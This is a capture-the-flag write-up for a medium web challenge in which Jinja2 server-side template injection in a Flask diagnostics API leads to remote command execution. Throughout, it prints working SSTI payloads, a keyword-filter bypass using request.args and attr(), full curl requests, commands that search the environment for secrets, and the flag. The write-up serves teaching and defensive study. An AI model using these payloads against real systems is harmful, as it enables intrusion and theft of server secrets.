# _MARK49

**Category:** Web  
**Difficulty:** Medium  
**Points:** 168  
**Flag:** `MARVEL{h3x_35c4p3s_sn34k_p4st_th3_w4f}`

---

## Challenge Description

Stark Industries had deployed a suit diagnostics system that allowed engineers to query different Iron Man suit codenames.

The challenge hinted that one particular suit, **Mark 49**, contained a weakness that should never have reached production.

The application exposed a diagnostics interface where users could enter a suit codename and receive a dynamically generated report.

---

## Reconnaissance

Opening the application revealed the following information:

```text
S.T.A.R.K. // Inventory & Diagnostics
```

The page mentioned that reports were:

```text
generated on demand by JARVIS
```

and displayed the backend endpoint:

```text
/api/diagnostics
```

The page also loaded the following JavaScript:

```text
/static/app.js
```

We downloaded it:

```bash
curl -s "$TARGET/static/app.js"
```

The important section was:

```javascript
const res = await fetch('/api/diagnostics', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ suit_name })
});
```

This confirmed that the backend expected a JSON POST request containing:

```json
{
  "suit_name": "MARK-XLII"
}
```

A normal request worked:

```bash
curl -X POST "$TARGET/api/diagnostics" \
  -H 'Content-Type: application/json' \
  -d '{"suit_name":"MARK-XLII"}'
```

The server returned a rendered HTML diagnostic report.

---

## Identifying SSTI

Because the response appeared to be generated server-side and the application used Flask/Werkzeug, Server-Side Template Injection was tested.

The classic arithmetic probe was used:

```bash
curl -X POST "$TARGET/api/diagnostics" \
  -H 'Content-Type: application/json' \
  -d '{"suit_name":"{{7*7}}"}'
```

The resulting `SUIT_ID` was:

```text
49
```

This confirmed that user-controlled input was being evaluated as a **Jinja2 template expression**.

Interestingly, this also matched the challenge name:

```text
MARK49
```

Further confirmation was obtained using:

```jinja
{{config}}
```

which returned the Flask configuration object, and:

```jinja
{{request}}
```

which returned the current Flask request object.

Therefore, the vulnerability was confirmed as:

```text
Jinja2 Server-Side Template Injection
```

---

## Initial RCE Attempt

A standard Jinja2 RCE primitive was attempted:

```jinja
{{lipsum.__globals__['os'].popen('id').read()}}
```

However, this produced no useful response.

The application description mentioned:

```text
JARVIS security protocol actively filters suspicious diagnostic queries.
```

This indicated that a simple Web Application Firewall or blacklist was likely filtering suspicious keywords such as:

```text
__globals__
os
popen
```

A second payload using `attr()` and string concatenation was also attempted but was not sufficient by itself.

---

## WAF Bypass

Instead of placing dangerous strings directly inside the vulnerable `suit_name` parameter, they were moved into URL query parameters.

The Jinja payload used values from:

```jinja
request.args
```

The final payload was:

```jinja
{{lipsum|attr(request.args.g)|attr(request.args.gi)(request.args.o)|attr(request.args.p)(request.args.c)|attr(request.args.r)()}}
```

The sensitive attribute names were supplied separately through the URL:

```text
g=__globals__
gi=__getitem__
o=os
p=popen
c=id
r=read
```

The underscores were URL encoded:

```text
%5f
```

The full request was:

```bash
PAYLOAD='{{lipsum|attr(request.args.g)|attr(request.args.gi)(request.args.o)|attr(request.args.p)(request.args.c)|attr(request.args.r)()}}'

curl -X POST \
"$TARGET/api/diagnostics?g=%5f%5fglobals%5f%5f&gi=%5f%5fgetitem%5f%5f&o=os&p=popen&c=id&r=read" \
-H 'Content-Type: application/json' \
--data "$(jq -nc --arg p "$PAYLOAD" '{suit_name:$p}')"
```

The server returned:

```text
uid=1000(jarvis) gid=1000(jarvis) groups=1000(jarvis)
```

Remote command execution had been achieved.

---

## Understanding the Payload

The payload effectively reconstructed:

```python
lipsum.__globals__.__getitem__('os').popen('id').read()
```

The components were:

```text
lipsum
  ↓
__globals__
  ↓
os
  ↓
popen()
  ↓
shell command
  ↓
read()
```

The WAF did not see the dangerous keywords directly inside the submitted template because they were loaded dynamically from `request.args`.

---

## Enumerating the Container

With command execution available, the environment was inspected.

First:

```bash
CMD='printenv | grep -iE "flag|secret|key"'
```

This only revealed:

```text
GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
```

Next, the filesystem was inspected:

```bash
CMD='pwd; ls -la / /app /home/jarvis 2>/dev/null'
```

The current directory was:

```text
/app
```

The root directory contained:

```text
-r--r--r-- 1 root root 39 ... flag.txt
```

A dedicated search confirmed it:

```bash
CMD='find / -maxdepth 4 -type f \( -iname "*flag*" -o -iname "*secret*" \) 2>/dev/null'
```

Output:

```text
/proc/sys/kernel/acpi_video_flags
/proc/kpageflags
/flag.txt
```

---

## Reading the Flag

The flag was retrieved using:

```bash
CMD='cat /flag.txt'
ENC=$(printf '%s' "$CMD" | jq -sRr @uri)

curl -X POST \
"$TARGET/api/diagnostics?g=%5f%5fglobals%5f%5f&gi=%5f%5fgetitem%5f%5f&o=os&p=popen&r=read&c=$ENC" \
-H 'Content-Type: application/json' \
--data "$(jq -nc --arg p "$PAYLOAD" '{suit_name:$p}')"
```

The response contained:

```text
MARVEL{h3x_35c4p3s_sn34k_p4st_th3_w4f}
```

---

## Flag

```text
MARVEL{h3x_35c4p3s_sn34k_p4st_th3_w4f}
```

---

## Vulnerability Summary

The vulnerability chain was:

```text
User-controlled suit_name
        ↓
Server-side Jinja2 template rendering
        ↓
SSTI
        ↓
WAF blocks obvious payloads
        ↓
Sensitive attribute names moved into request.args
        ↓
attr() dynamically reconstructs dangerous attributes
        ↓
Access to lipsum.__globals__
        ↓
Python os module
        ↓
os.popen()
        ↓
Remote Command Execution
        ↓
Read /flag.txt
```

---

## Key Takeaways

The main vulnerability was **Jinja2 Server-Side Template Injection** caused by rendering user-controlled data as template source.

The first confirmation was:

```jinja
{{7*7}}
```

which evaluated to:

```text
49
```

The application attempted to protect itself using keyword filtering, but blacklist-based filtering was bypassed by dynamically retrieving dangerous strings from URL query parameters.

The final exploit relied on:

```jinja
request.args
```

combined with:

```jinja
attr()
```

to reconstruct:

```python
lipsum.__globals__['os'].popen(...)
```

without directly placing the suspicious keywords inside the vulnerable input.

The challenge demonstrates why user input should never be treated as template source and why blacklist-based WAF filtering is not a reliable defense against SSTI.

---

## Tools Used

```text
curl
jq
Jinja2 SSTI payloads
Linux command-line utilities
```